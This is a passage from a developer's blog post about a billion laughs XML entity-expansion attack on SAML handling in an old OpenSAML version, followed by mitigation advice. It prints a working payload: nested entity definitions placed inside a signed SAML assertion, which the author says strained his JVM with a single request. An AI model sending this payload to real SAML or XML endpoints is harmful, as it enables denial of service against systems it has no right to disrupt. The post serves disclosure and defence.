</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-xml data-lang=xml><span style=color:#ff79c6>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
<span style=color:#ff79c6>&lt;!DOCTYPE lolz [
</span><span style=color:#ff79c6>        &lt;!ENTITY lol &#34;lol&#34;&gt;</span>
        <span style=color:#ff79c6>&lt;!ENTITY lol1 &#34;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&#34;&gt;</span>
        <span style=color:#ff79c6>&lt;!ENTITY lol2 &#34;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&#34;&gt;</span>
        <span style=color:#ff79c6>&lt;!ENTITY lol3 &#34;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&#34;&gt;</span>
        <span style=color:#ff79c6>&lt;!ENTITY lol4 &#34;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&#34;&gt;</span>
        <span style=color:#ff79c6>&lt;!ENTITY lol5 &#34;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&#34;&gt;</span>
        <span style=color:#ff79c6>&lt;!ENTITY lol6 &#34;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&#34;&gt;</span>
        <span style=color:#ff79c6>&lt;!ENTITY lol7 &#34;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&#34;&gt;</span>
        <span style=color:#ff79c6>&lt;!ENTITY lol8 &#34;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&#34;&gt;</span>
        <span style=color:#ff79c6>&lt;!ENTITY lol9 &#34;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&#34;&gt;</span>
]&gt;
<span style=color:#ff79c6>&lt;Assertion</span> <span style=color:#50fa7b>xmlns=</span><span style=color:#f1fa8c>&#34;urn:oasis:names:tc:SAML:1.0:assertion&#34;</span> <span style=color:#50fa7b>xmlns:saml=</span><span style=color:#f1fa8c>&#34;urn:oasis:names:tc:SAML:1.0:assertion&#34;</span> <span style=color:#50fa7b>xmlns:samlp=</span><span style=color:#f1fa8c>&#34;urn:oasis:names:tc:SAML:1.0:protocol&#34;</span> <span style=color:#50fa7b>xmlns:xsd=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span style=color:#50fa7b>xmlns:xsi=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style=color:#50fa7b>AssertionID=</span><span style=color:#f1fa8c>&#34;_ff91848d70cc3eb916a2d0549bb2e11a&#34;</span> <span style=color:#50fa7b>IssueInstant=</span><span style=color:#f1fa8c>&#34;2018-03-29T14:32:38.564Z&#34;</span> <span style=color:#50fa7b>Issuer=</span><span style=color:#f1fa8c>&#34;redacted.com&#34;</span> <span style=color:#50fa7b>MajorVersion=</span><span style=color:#f1fa8c>&#34;1&#34;</span> <span style=color:#50fa7b>MinorVersion=</span><span style=color:#f1fa8c>&#34;1&#34;</span><span style=color:#ff79c6>&gt;&lt;Conditions</span> <span style=color:#50fa7b>NotBefore=</span><span style=color:#f1fa8c>&#34;2018-03-29T14:32:38.564Z&#34;</span> <span style=color:#50fa7b>NotOnOrAfter=</span><span style=color:#f1fa8c>&#34;2018-03-29T14:43:38.564Z&#34;</span><span style=color:#ff79c6>&gt;&lt;/Conditions&gt;&lt;AuthenticationStatement</span> <span style=color:#50fa7b>AuthenticationInstant=</span><span style=color:#f1fa8c>&#34;2018-03-29T14:32:38.564Z&#34;</span> <span style=color:#50fa7b>AuthenticationMethod=</span><span style=color:#f1fa8c>&#34;urn:oasis:names:tc:SAML:1.0:am:unspecified&#34;</span><span style=color:#ff79c6>&gt;&lt;Subject&gt;&lt;NameIdentifier</span> <span style=color:#50fa7b>Format=</span><span style=color:#f1fa8c>&#34;urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified&#34;</span> <span style=color:#50fa7b>NameQualifier=</span><span style=color:#f1fa8c>&#34;SubjectNameQualifier&#34;</span><span style=color:#ff79c6>&gt;</span>SubjectName<span style=color:#ff79c6>&lt;/NameIdentifier&gt;&lt;/Subject&gt;&lt;/AuthenticationStatement&gt;&lt;AttributeStatement&gt;&lt;Subject&gt;&lt;NameIdentifier</span> <span style=color:#50fa7b>Format=</span><span style=color:#f1fa8c>&#34;urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified&#34;</span> <span style=color:#50fa7b>NameQualifier=</span><span style=color:#f1fa8c>&#34;SubjectNameQualifier&#34;</span><span style=color:#ff79c6>&gt;</span>SubjectName<span style=color:#ff79c6>&lt;/NameIdentifier&gt;&lt;/Subject&gt;&lt;Attribute</span> <span style=color:#50fa7b>AttributeName=</span><span style=color:#f1fa8c>&#34;sspayload&#34;</span> <span style=color:#50fa7b>AttributeNamespace=</span><span style=color:#f1fa8c>&#34;http://redacted.com&#34;</span><span style=color:#ff79c6>&gt;&lt;AttributeValue&gt;</span>NeGxMf9WPEcFqN7J7mfmW0G0pBOUO5nvhXj71WqxeuE=<span style=color:#ff79c6>&lt;/AttributeValue&gt;&lt;/Attribute&gt;&lt;Attribute</span> <span style=color:#50fa7b>AttributeName=</span><span style=color:#f1fa8c>&#34;payload&#34;</span> <span style=color:#50fa7b>AttributeNamespace=</span><span style=color:#f1fa8c>&#34;http://redacted.com&#34;</span><span style=color:#ff79c6>&gt;&lt;AttributeValue&gt;</span>iXNKzPtGTrmBZ/...A4tKERF1nFJRJE5DSqnJZc4wd1QU3C5S<span style=color:#ff79c6>&lt;/AttributeValue&gt;&lt;/Attribute&gt;&lt;/AttributeStatement&gt;&lt;ds:Signature</span> <span style=color:#50fa7b>xmlns:ds=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2000/09/xmldsig#&#34;</span><span style=color:#ff79c6>&gt;</span>
    <span style=color:#ff79c6>&lt;ds:SignedInfo&gt;</span>
        <span style=color:#ff79c6>&lt;ds:CanonicalizationMethod</span> <span style=color:#50fa7b>Algorithm=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2001/10/xml-exc-c14n#&#34;</span><span style=color:#ff79c6>&gt;</span>&amp;lol9;<span style=color:#ff79c6>&lt;/ds:CanonicalizationMethod&gt;</span>
        <span style=color:#ff79c6>&lt;ds:SignatureMethod</span> <span style=color:#50fa7b>Algorithm=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2000/09/xmldsig#hmac-sha1&#34;</span><span style=color:#ff79c6>&gt;&lt;/ds:SignatureMethod&gt;</span>
        <span style=color:#ff79c6>&lt;ds:Reference</span> <span style=color:#50fa7b>URI=</span><span style=color:#f1fa8c>&#34;#_ff91848d70cc3eb916a2d0549bb2e11a&#34;</span><span style=color:#ff79c6>&gt;</span>
            <span style=color:#ff79c6>&lt;ds:Transforms&gt;</span>
                <span style=color:#ff79c6>&lt;ds:Transform</span> <span style=color:#50fa7b>Algorithm=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2000/09/xmldsig#enveloped-signature&#34;</span><span style=color:#ff79c6>&gt;&lt;/ds:Transform&gt;</span>
                <span style=color:#ff79c6>&lt;ds:Transform</span> <span style=color:#50fa7b>Algorithm=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2001/10/xml-exc-c14n#&#34;</span><span style=color:#ff79c6>&gt;&lt;ec:InclusiveNamespaces</span> <span style=color:#50fa7b>xmlns:ec=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2001/10/xml-exc-c14n#&#34;</span> <span style=color:#50fa7b>PrefixList=</span><span style=color:#f1fa8c>&#34;code ds kind rw saml samlp typens #default xsd xsi&#34;</span><span style=color:#ff79c6>&gt;&lt;/ec:InclusiveNamespaces&gt;&lt;/ds:Transform&gt;</span>
            <span style=color:#ff79c6>&lt;/ds:Transforms&gt;</span>
            <span style=color:#ff79c6>&lt;ds:DigestMethod</span> <span style=color:#50fa7b>Algorithm=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/2000/09/xmldsig#sha1&#34;</span><span style=color:#ff79c6>&gt;&lt;/ds:DigestMethod&gt;</span>
            <span style=color:#ff79c6>&lt;ds:DigestValue&gt;</span>NObH8OXaRhbv/cIRBNes0Jc5m3c=<span style=color:#ff79c6>&lt;/ds:DigestValue&gt;</span>
        <span style=color:#ff79c6>&lt;/ds:Reference&gt;</span>
    <span style=color:#ff79c6>&lt;/ds:SignedInfo&gt;</span>
    <span style=color:#ff79c6>&lt;ds:SignatureValue&gt;</span>89GMiWLrEWThzKpzeDjnCKjs1hI=<span style=color:#ff79c6>&lt;/ds:SignatureValue&gt;</span>
<span style=color:#ff79c6>&lt;/ds:Signature&gt;&lt;/Assertion&gt;</span>
</code></pre></td></tr></table></div></div><p>The embedded doctype and the LOL entities that result in the XML processor processing a LOT of &ldquo;lol&rdquo; ENTITIES - hence the name billion laugh attack.</p><p>Here is what it did to my local JVM:</p><p><img src=/images/laughing_out_loud_malicious_auth_stats.png alt></p><p> and that is just a single request.</p><h1 id=mitigation>Mitigation</h1><p>I rewrote the code to use OpenSAML 3.3 which is not vulnerable. Unfortunately, as the API for OpenSAML changed significantly that wasn&rsquo;t just a matter of changing dependencies but rewriting the SAML generation code from scratch&mldr;</p><h1 id=moral-of-the-story>Moral of the Story</h1><ul><li>Do not use outdated libs</li><li>Do run the OWASP checker</li><li>XML is evil</li></ul><ul class=pa0></ul><div class="mt6 instapaper_ignoref"></div></div><aside class="w-30-l mt6-l"></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://beny23.github.io/>&copy; Software Design Systems 2022</a><div><a href=https://stackoverflow.com/users/227140/beny23 target=_blank class="link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Stack Overflow link" rel=noopener aria-label="follow on Stack Overflow——Opens in a new window"><svg height="32" style="enable-background:new 0 0 67 67" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="32"><path d="M12 0C5.373.0.0 5.373.0 12s5.373 12 12 12 12-5.373 12-12S18.627.0 12 0zm.869 5.903 3.114 4.567-.975.665-3.115-4.567.976-.665zm-2.812 2.585 4.84 2.838-.6 1.017-4.842-2.838.602-1.017zm-1.276 2.724 5.413 1.521-.291 1.077-5.428-1.458.306-1.14zm-.588 2.461 5.687.569-.103 1.12-5.691-.513.107-1.176zm-.169 2.16h5.835V17h-5.835v-1.167zM16 19H6v-6h1v5h8v-5h1v6zm.195-8.602-.945-5.446 1.162-.202.947 5.446-1.164.202z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://twitter.com/giskard23 target=_blank class="link-transition twitter link dib z-999 pt3 pt0-l mr1" title="Twitter link" rel=noopener aria-label="follow on Twitter——Opens in a new window"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://www.linkedin.com/in/gerald-benischke-9811b663 target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30C64 50.568 50.568 64 34 64zM26.354 48.137V27.71h-6.789v20.427H26.354z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/beny23 target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></footer><script src=/dist/js/app.3fc0f988d21662902933.js></script></body></html>